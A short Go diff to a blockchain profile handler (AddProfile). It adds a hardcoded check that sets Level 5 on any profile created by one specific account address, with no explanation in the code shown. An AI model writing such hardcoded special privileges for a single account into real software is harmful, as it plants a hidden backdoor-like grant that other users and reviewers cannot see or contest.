@@ -59,6 +59,9 @@ func (ms msgServer) AddProfile(goCtx context.Context, msg *types.MsgAddProfileRe
 		Website:       profileJson.Website,
 		CreationTime:  blockTime,
 	}
+	if msg.Creator == "tlock1efd63aw40lxf3n4mhf7dzhjkr453axurggdkvg" {
+		profile.Level = 5
+	}
 
 	//if exists {
 	//	nickname := profileJson.Nickname
